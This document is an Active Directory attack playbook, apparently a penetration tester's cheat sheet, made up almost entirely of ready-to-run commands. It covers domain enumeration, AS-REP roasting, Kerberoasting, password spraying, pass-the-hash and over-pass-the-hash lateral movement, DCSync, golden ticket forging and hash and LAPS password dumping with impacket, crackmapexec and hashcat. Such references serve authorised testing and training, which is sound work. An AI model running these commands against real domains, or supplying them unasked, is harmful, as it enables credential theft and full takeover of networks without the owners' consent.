# Active Directory Attack Playbook

## Initial Enumeration

### Domain info
```bash
# from Linux
crackmapexec smb $DC -u '' -p '' --shares
ldapsearch -x -H ldap://$DC -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName
rpcclient -U '' -N $DC -c "enumdomusers"
```

### BloodHound collection
```bash
# from Linux
bloodhound-python -u user -p 'pass' -d domain.local -ns $DC -c All
# from Windows
.\SharpHound.exe -c All
```

## Credential Attacks

### AS-REP Roasting (no creds needed)
```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

### Kerberoasting (need any domain user)
```bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip $DC -request
hashcat -m 13100 hashes.txt rockyou.txt
```

### Password Spraying
```bash
crackmapexec smb $DC -u users.txt -p 'Password1' --continue-on-success
# careful: lockout policy — check first:
crackmapexec smb $DC -u user -p pass --pass-pol
```

## Lateral Movement

### Pass-the-Hash
```bash
crackmapexec smb $TARGET -u admin -H 'NTHASH' --exec-method smbexec -x 'whoami'
impacket-psexec domain.local/admin@$TARGET -hashes :NTHASH
impacket-wmiexec domain.local/admin@$TARGET -hashes :NTHASH
evil-winrm -i $TARGET -u admin -H NTHASH
```

### Over-Pass-the-Hash (get TGT from NTLM)
```bash
impacket-getTGT domain.local/admin -hashes :NTHASH -dc-ip $DC
export KRB5CCNAME=admin.ccache
impacket-psexec domain.local/admin@$TARGET -k -no-pass
```

## Domain Escalation

### DCSync (need replication rights)
```bash
impacket-secretsdump domain.local/admin:pass@$DC
# or with hash
impacket-secretsdump domain.local/admin@$DC -hashes :NTHASH
```

### Golden Ticket
```bash
# need krbtgt hash from dcsync
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-... -nthash KRBTGT_HASH -duration 3650 administrator
export KRB5CCNAME=administrator.ccache
```

### Unconstrained Delegation
```bash
# find computers with unconstrained delegation
ldapsearch -x -H ldap://$DC -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" dn
# coerce auth + capture TGT
```

## Post-Exploitation

### Dump hashes
```bash
impacket-secretsdump domain.local/admin:pass@$TARGET
# SAM + LSA + NTDS if DC
```

### Extract LAPS passwords
```bash
crackmapexec ldap $DC -u user -p pass -M laps
```
